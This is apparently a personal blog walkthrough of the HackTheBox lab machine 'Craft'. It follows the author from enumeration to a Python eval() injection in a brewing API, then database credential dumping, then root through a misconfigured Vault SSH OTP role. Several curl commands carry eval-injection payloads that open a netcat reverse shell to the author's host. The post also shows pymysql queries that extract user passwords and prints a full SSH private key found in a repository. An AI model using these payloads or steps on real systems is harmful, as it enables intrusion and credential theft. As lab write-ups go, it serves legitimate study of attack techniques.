+++
date = "2026-04-04"
draft = false
title = "Craft"
categories = ["Pentesting", "HackTheBox", "CPTS", "Linux"]
tags = ["nmap", "ffuf", "curl", "python", "nc", "vault", "ssh", "api" ]
summary = "Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root."
+++

## Summery


## Enumeration
I started my nmap scan with `sudo nmap -sC -sV -O -Pn 10.129.21.109; sleep 5; sudo nmap -p- -Pn 10.129.21.109; sleep 5; sudo nmap -sU -Pn 10.129.21.109`

{{< accordion >}}
  {{< accordionItem title="nmap scan results" icon="code">}}
	Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:39 CEST
	Nmap scan report for 10.129.21.109
	Host is up (0.028s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
	|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
	|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.95%E=4%D=4/2%OT=22%CT=1%CU=31105%PV=Y%DS=2%DC=I%G=Y%TM=69CE8DD5
	OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
	OS:SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%C
	OS:I=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GC
	OS:D=2%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E2ST11NW7%O2=M4E2ST11NW7%O3=M4E
	OS:2NNT11NW7%O4=M4E2ST11NW7%O5=M4E2ST11NW7%O6=M4E2ST11)WIN(W1=FE88%W2=FE88%
	OS:W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M4E2NNSNW7%CC
	OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
	OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
	OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
	OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
	
	Network Distance: 2 hops
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
	Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:40 CEST
	Nmap scan report for 10.129.21.109
	Host is up (0.029s latency).
	Not shown: 65532 closed tcp ports (reset)
	PORT     STATE SERVICE
	22/tcp   open  ssh
	443/tcp  open  https
	6022/tcp open  x11
	
	Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
	Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 17:40 CEST
	Nmap scan report for 10.129.21.109
	Host is up (0.029s latency).
	Not shown: 999 closed udp ports (port-unreach)
	PORT   STATE         SERVICE
	68/udp open|filtered dhcpc
	
	Nmap done: 1 IP address (1 host up) scanned in 1008.69 seconds
  {{< /accordionItem >}}
{{< /accordion >}}
<br>
I accessed the port 6022 and found this info in a simple clear text
```
SSH-2.0-Go
��ü)¹)“3bU=²¤���Œcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1���ssh-rsa���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���none���none�������������bq¯
```
[Speed guide](https://www.speedguide.net/port.php?port=6022) shows that port 6022 belong to the x11 service which is an X Window System.
*"The X Window System is a windowing system for bitmap displays, common on Unix-like operating systems." ~ Wikipedia*
[Here](https://www.maketecheasier.com/the-x-window-system/) is a good read on the basic concept of x11.

The website on 443 at first didn't work for me but now I can view it.
Front page suggest that we will work with some API calls. both menu options use two new subdomains "api.craft.htb" and "gogs.craft.htb". I will add them to my `/etc/hosts` and run `ffuf` to look for any other subdomains and to enumerate directories.
`ffuf -u https://craft.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 291`
`ffuf -u https://craft.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.craft.htb" -fs 3779`

I also didn't find any comments on the main website, it does use nginx 1.15.8.
api subdomain hosts different api calls. Two interesting one are authentication check to check validity of an authorization token and the authentication login to create the said token.
gogs is a local git repo tools. I found some users related to it
``` Users
administrator
ebachman Erlich Bachman
dinesh Dinesh Chugtai
gilfoyle Bertram Gilfoyle
```

I suspect there will be some API keys, tokens or creds in the repository by accident. I found a discussion about adding bogus ABV values; it was partially patched but still seems insecure, making it a potential attack vector for exploring API behavior.

I this issue we can see this command holding a JWT token (JSON Web Token).
`curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'`

These tokens have three parts:
1. `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` - Header
2. `eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0` - Payload
3. `wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw` - Signature

Depending on the cryptographic in place I could crack it, but I'd need to look into that more. Let's check other information that we can find.

Later on that issue one of the users shows a commit with this patch which another developer find bad 
```
+        # make sure the ABV value is sane.
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
+        else:
+            create_brew(request.json)
+            return None, 201
```
This is Python script, it checks if the user provided "abv" input is higher than 1, and depending on result of this check creates given outcomes.
There are two interesting parts of the script for us. It uses `eval()` which is a known dangerous function in a number of different programming languages. It's dangerous because it runs string data as an executable instruction. 
The second interesting part is that `request.json['abv'])` plainly outputs unfiltered user output into the command.
Both of these weakness are bad on their own as one gives a possibility of command execution and another of command injection. Together they are a really great foothold opportunity.

```
parrot@parrot (~): curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"a","brewer":"a","style":"a","abv":"__import__(\"os\").system(\"id\")"}' 
{"message": "Invalid token or no token found."}
```

To try and attempt to exploit this vulnerability I'd have to have a valid token, meaning I'd have to find a not expired one in the wild or generate one which requires credentials.

I looked through the issues, repository and finally the commits and found some accidentally pushed credentials - dinesh:4aUh0A8PbVJxgd.

I used them to create my token request at the api dashboard.
No when I try to exploit the vulnerable code my token goes through and I can test my injection payloads.
```
curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzc1MjA2MjQzfQ.1MRivtSjMK8IJKagIWHZRtp7M_632Rhp0vEk84UKYmU' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"a","brewer":"a","style":"a","abv":"__import__("os").system("id")"}' 
```

```
TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token')
```

This works too
``` JSON
TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); \
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"0xdf\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"__import__('os').system('nc 10.10.15.189 1337 -e /bin/sh')\"}" -k -H "X-CRAFT-API-TOKEN: $TOKEN"
```

This finally works!
``` JSON
TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | jq -r '.token'); \
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d '{"id":0,"brewer":"0xdf","name":"beer","style":"bad","abv":"__import__(\"os\").system(\"nc 10.10.15.189 1337 -e /bin/sh\")"}' -k -H "X-CRAFT-API-TOKEN: $TOKEN"
```

I had a surprising amount of problems with quotation marks and escaping them correctly. I spent a lot of time tweaking these commands and breaking down the api logic locally.

For practice and better understanding of working with API, HTTP requests and Python I created a working script that exploits this vulnerability.
The only requirements are to add `api.craft.htb` into the `/etc/hosts` and `python3` to run it - you can view it on my GitHub.

With this behind us we got a limited shell of the `5a3d243127f5` host on which we are `root`. Looking the root directory we can see the `.dockerenv` folder hinting that we're inside of a container. Manual enumeration doesn't show any interesting vectors besides the webapp files. In them we find `dbtest.py` which is a file we saw on gogs, it creates a query to a db from the POST data it gets. Database details like the credentials, destination and it's name are said to be in some `settings` file. Moving into `craft_api` folder we can indeed find it. Inside, we can find the database details and a service token.
``` Loot
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
```

I first tried to use mysql locally - but it isn't installed - and call it remotely with `mysql -u craft -pqLGockJ6G2J75O -h 10.129.22.88` - but this doesn't work and hangs my shell. This is because the database isn't local, it's in fact on the `db` host which I assume is the Docker daemon.
Due to the fact that my shell is connected to a simple web request it's limited by the timeout time of the web server which is approximately 60 seconds. Due to that limitation, I was thinking how to best access the database. As my shell access was somewhat flimsy I didn't want to bother setting up a chisel tunnel and work with transferring files - which also ruled out downloading `mysql` and similar tooling.
What I stumbled upon was `pymysql` which is a python library for working with sql. As the whole box is somehow very Python for me from start until now, I decided to try it out.

With my 60 second window of opportunity I tested my commands and came up with a working one.
`python -c "import pymysql; c=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=c.cursor(); cur.execute('SHOW TABLES'); print(cur.fetchall())"`
This command imports `pymysql`, connects to the database, creates a cursor which is a Python object that channels and sends the SQL queries to the database as well as simply show the queried data. You just need to adjust the query in the cursor and you can fetch any details from the database.
Output from the above query showed me that there are two tables `brew` and `user`. Of course the latter is more interesting for us, so I ran another query.
`python -c "import pymysql; c=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=c.cursor(); cur.execute('SELECT * FROM user'); print(cur.fetchall())"`
Which gave as further credentials:
``` Loot
((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
```

Let's try to access SSH with them.
Sadly both on the normal port 22 and on the SSH via Go port 6022 I was unable to use it. There is however a login form on gogs.
I found two public keys for the users, likely for authentication to gogs, nothing special, especially without the private keys.
dinesh: `SHA256:8Fc2kZiv0Y+kjkh8atKr6brzBiM1DoDIhG6LN1ktPfA`
gilfoyle: `SHA256:D28DXyVaw0/mPuLBp3mDbS8z6oCRKS1hawJ5gxecFBQ`

Digging further into gilfoyle I found that he had a private repository called `craft-infra` on which we can find his public and private SSH keys, likely to the dc host.
{{< accordion >}}
  {{< accordionItem title="SSH private key" icon="code">}}
	parrot@parrot (~/Desktop/htb/machines/craft): cat id_rsa 
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
    qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
    F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
    zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
    RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
    lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
    pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
    B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
    4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
    Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
    3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
    Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
    ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
    GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
    0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
    5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
    cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
    elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
    CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
    hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
    a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
    MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
    Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
    Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
    I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
    6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
    -----END OPENSSH PRIVATE KEY-----
  {{< /accordionItem >}}
{{< /accordion >}}
<br>
When I try to authenticate with `ssh -i id_rsa gilfoyle@10.129.22.88` i get a message "Load key "id_rsa": error in libcrypto". From what I've read this can happen when SSH expects an older private key format called PEM. You can easily know which one is which by looking at the first line:
New one: `-----BEGIN OPENSSH PRIVATE KEY-----`
Old one: `-----BEGIN RSA PRIVATE KEY-----`

Luckily, the key can be formatted easily with `ssh-keygen`. First let's make a copy of the original with `cp id_rsa id_rsa-original` and format the copy with `ssh-keygen -p -f id_rsa -m PEM`.
When I tried to run this, I got another error stating `Failed to load key id_rsa: error in libcrypto`.

After some digging, I [found an article](https://maxrohde.com/2025/08/16/fix-error-in-libcrypto-error-reading-private-ssh-key/) stating that the issue was because the user didn't include a newline after the closing line of the key. I went back and raw copied the key from the github. I had two new lines at the end, when I pasted it like so, it worked flawlessly.

Enumerating the user they don't have any low hanging permissions or rights to take advantage on. Interestingly, I'm on the `craft.htb` host and not `db` which I suspected was the hostname of the Docker host.
I looked a bit further and found `.vault-token` file which contains this token `f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle`. I looked through the filesystem with `find / -iname "*vault*" 2>/dev/null` and found these files
``` 
/home/gilfoyle/.vault-token
/var/log/vaultssh.log
/usr/local/bin/vault
/usr/local/bin/vault-ssh-helper
/usr/local/etc/vault-ssh-helper.hcl
```

I then ran looked through them manually and greped for key words in them but didn't find anything interesting. I tried to ssh into the port 6022 as maybe that is the vault that is mentioned. The amount of SSH files suggested that but I still can't authenticate there.
There are ssh related files and that the whole box is about web requests I decided to run my directory and subdomain enumerations as I canceled them prematurely at the start of the box. I scanned for some time but nothing new came up.

I looked again through the `infra.craft` repo and found a folder named `vault`.
as both `vault` and `vault-ssh-helper` are in the `bin` folder I should be able to execute them and see how they work.
I can read and list secrets from a vault, the issue is that I don't know the path to it. I tried to do `vault list /ssh/roles/root_otp` as I saw this path in `secrets.sh` - didn't work and seemed far fetched.
There is a way to use ssh to authenticate into a vault, maybe i can use that token I found before in it.
This is the info from the `help` option:
```
# Info from the `help` option
SSH using the OTP mode (requires sshpass for full automation):
	$ vault ssh -mode=otp -role=my-role user@1.2.3.4

SSH using the CA mode:
	$ vault ssh -mode=ca -role=my-role user@1.2.3.4

SSH using CA mode with host key verification:
	$ vault ssh \
		-mode=ca \
		-role=my-role \
		-host-key-mount-point=host-signer \
		-host-key-hostnames=example.com \
	user@example.com
```
There are three way to authenticate "one time password" and two "certificate authority" modes. Looking at the token I found it looks more like an OTP authentication.

I reviewed the source code and found these parts interesting:
```
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0

Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle

storage "file" {
	path = "/vault/data"
}
ui = false
listener "tcp" {
	address = "0.0.0.0:8200"
	tls_cert_file = "/vault/pki/vault.craft.htb.crt"
	tls_key_file = "/vault/pki/vault.craft.htb.key"
	tls_min_version = "tls12"
```

The first command is the most important one - it creates a role `root_otp` which can request to get OTPs for root and those request can come from any IP. This represents a lazy admin setup and because of this can get a root access simply by requesting it.
The token is an OTP that was used by the user, it showed me what it looks like.
The last script shows that the vault is located at `/vault/data` and that it is listening on all interfaces with HTTPS on the 8200 port.

To get the root, I simply ran `vault ssh -mode=otp -role=root_otp root@10.129.22.88`.



This box was challenging to me, one of the most confusing I worked on. I had little experience until now with working with APIs and creating injections is something I need to practice more. I liked that I challenged myself to write my first working exploit for this box and it helped me to learn and refresh my Python knowledge. Simulation of reading up on a git repo and a really hands on code review was a great learning experience. I never worked with HashiCorp Vault before so this was also interesting - a lot of pivoting as well.

For code review and injections I think is important to try to really concentrate, go down the rabbit hole and really try to understand the logic of the mechanism. Sounds trivial I know, but I feel I could save a lot of time by starting with such hard mindset from the beginning.

PS: I still didn't figure out what was port 6022 used for, so like ¯\\_(ツ)_/¯

